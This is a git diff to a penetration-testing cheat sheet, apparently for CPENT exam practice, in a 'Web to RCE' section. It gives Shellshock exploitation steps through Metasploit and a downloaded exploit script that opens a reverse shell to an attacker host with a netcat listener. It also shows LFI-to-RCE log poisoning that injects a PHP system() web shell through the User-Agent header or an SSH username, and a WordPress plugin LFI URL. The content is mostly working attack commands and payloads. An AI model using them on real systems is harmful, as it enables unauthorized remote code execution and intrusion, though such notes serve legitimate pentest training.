@@ -1,6 +1,6 @@
 Web to RCE
 ===
-🔙 [MENU README](../README.md)
+🔙 [MENU README](../README.md#note)
 
 # SHELLSHOCK
 ```
@@ -56,6 +56,7 @@ dirb http://192.168.0.24/cgi-bin
 msfconsole
 msf6 > search shellshock
 # 5 exploit/mutli/http/apache_mod_cgi_bash_env_execode_cgi Bash Enviroment Variable Code Injection
+# exploit/mutli/http/apache_mod_cgi_bash_env_exec
 msf6 > use 5
 msf6 > show options
 msf6 > set RHOSTS 192.168.0.24
@@ -65,10 +66,18 @@ msf6 > exploit
 meterpreter > shell
 # Get TTY Shell
 script -c /bin/bash /dev/null
-
+https://file+.vscode-resource.vscode-cdn.net/c:/Users/Rex/Desktop/GITHUB/PenTest/CPENT-CheatSheet/README.md
 # Privillege Escalation
 uname -a #低版本PwnKit直接K
 
+```
+tool
+```bash
+wget https://github.com/b4keSn4ke/CVE-2014-6271/raw/main/shellshock.py
+
+python2 shellshock.py -t 172.25.30.5 -u /cgi-bin/keygen -r 172.27.232.2 -p 1234 -s dev_tcp
+
+nc -lvnp 1234
 ```
 
 # LFI to RCE
@@ -91,11 +100,12 @@ chmod 775 -R /proc/self/environ
 # http://192.168.0.10/inc.php?file =/var/log/apache2/access.log
 # 目前可以控制任意檔案瀏覽，那我可不可以控我瀏覽的檔案內容?
 # 答案是可以的可以控制Access中的User-Agent
-User-Agent:<?php system($_GET [cmd]);?>
+User-Agent:<?php system($_GET[cmd]);?>
 # 或者這樣
-ssh '<?php system($_GET [cmd]);?>'@172.25.20.6
+ssh '<?php system($_GET[cmd]);?>'@172.25.20.6
 
 # http://192.168.0.10/inc.php?file =/var/log/apache2/access.log&cmd=ls
+# http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log&cmd=/etc/flag
 
 
 # Authencation
